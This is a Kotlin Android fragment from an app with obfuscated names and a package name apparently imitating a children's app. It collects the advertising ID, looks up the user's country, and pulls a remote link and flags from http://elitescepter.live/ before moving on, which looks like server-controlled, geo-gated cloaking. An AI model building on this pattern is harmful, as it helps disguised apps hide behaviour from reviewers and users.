package com.sinyee.babyb

import android.os.Bundle
import androidx.fragment.app.Fragment
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.appcompat.app.AlertDialog
import androidx.lifecycle.lifecycleScope
import androidx.navigation.fragment.findNavController
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.android.material.snackbar.Snackbar
import com.sinyee.babyb.databinding.FragmentTvvvvvvBinding
import com.sinyee.babyb.oothththt.Constance
import com.sinyee.babyb.oothththt.DataStoreManager
import com.sinyee.babyb.oothththt.DataStoreManager.Companion.advertIDDataStoreKey
import com.sinyee.babyb.oothththt.DataStoreManager.Companion.appsCheckerDataStoreKey
import com.sinyee.babyb.oothththt.DataStoreManager.Companion.linkCheckerDataStoreKey
import com.sinyee.babyb.oothththt.DataStoreManager.Companion.listOfAllGeoDataStoreKey
import com.sinyee.babyb.oothththt.DataStoreManager.Companion.userGeoDataStoreKey
import com.sinyee.babyb.oothththt.DevilApiifrfrrrf
import dagger.hilt.android.AndroidEntryPoint
import dagger.hilt.android.scopes.ActivityScoped
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import javax.inject.Inject

@AndroidEntryPoint
@ActivityScoped
class TvvvvvvFragment : Fragment() {
    var dataLoading = ""
    var devilLoading = ""

    @Inject
    lateinit var dataManager: DataStoreManager

    private var _binding: FragmentTvvvvvvBinding? = null
    private val binding get() = _binding ?: throw RuntimeException("FragmentTvvvvvvBinding = null")

    private val retrofitDevil: DevilApiifrfrrrf by lazy {
        Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://elitescepter.live/")
            .build()
            .create(DevilApiifrfrrrf::class.java)
    }

    private val geoApi: DevilApiifrfrrrf by lazy {
        Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(DevilApiifrfrrrf::class.java)
    }


    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentTvvvvvvBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {


        try {

            lifecycleScope.launch {
                withContext(Dispatchers.IO){
                    getAdId()
                }

                getGeoData()
                getDataDeviiiil()

                while (true) {
                    if (dataLoading == "done" && devilLoading == "done") {
                        findNavController().navigate(R.id.action_tvvvvvvFragment_to_threeeeeeeeeeFragment)
                        break
                    } else {
                        delay(1000)
                    }
                }
            }








        } catch (e: Exception) {
            detdefdfe()
        }
        super.onViewCreated(view, savedInstanceState)
    }


    override fun onDestroy() {
        _binding = null
        super.onDestroy()
    }

    private suspend fun getAdId(){

        val advertising = AdvertisingIdClient(requireContext().applicationContext)
        advertising.start()
        val advertID = advertising.info.id?: Constance.KEY_NO_DATA


        dataManager.saveStringToDataStore(key = advertIDDataStoreKey, advertID)

    }

    private fun kpkpkpkp() {
        AlertDialog.Builder(requireContext())
            .setTitle("Exit")
            .setMessage("Current data will not be saved, EXIT?")
            .setPositiveButton("Yes, Exit") { _, _ ->
                requireActivity().onBackPressed()
            }
            .setNegativeButton("No") { _, _ ->
            }
            .setCancelable(true)
            .create()
            .show()
    }

    private suspend fun getGeoData() {
        val result = geoApi.getData().body()?.countryCode

        lifecycleScope.launch {
            dataManager.saveStringToDataStore(key = userGeoDataStoreKey, result?:"no geo")

            dataLoading = "done"
        }

    }


    private suspend fun getDataDeviiiil() {

        val apiResult = retrofitDevil.getDataDev().body()

        val linka = apiResult?.view?:Constance.KEY_NO_DATA
        val appsChecker = apiResult?.isAppsLaunched?:Constance.KEY_NO_DATA
        val listOFAllGeo = apiResult?.geo?:Constance.KEY_NO_DATA

        lifecycleScope.launch {
            dataManager.saveStringToDataStore(key = linkCheckerDataStoreKey, linka)
            dataManager.saveStringToDataStore(key = listOfAllGeoDataStoreKey, listOFAllGeo)
            dataManager.saveStringToDataStore(key = appsCheckerDataStoreKey, appsChecker)

            devilLoading = "done"
        }
    }


    private fun detdefdfe() {
        Snackbar.make(
            binding.root,
            "Oops something went wrong, please try again...",
            Snackbar.LENGTH_LONG
        ).show()
        requireActivity().onBackPressed()
    }


}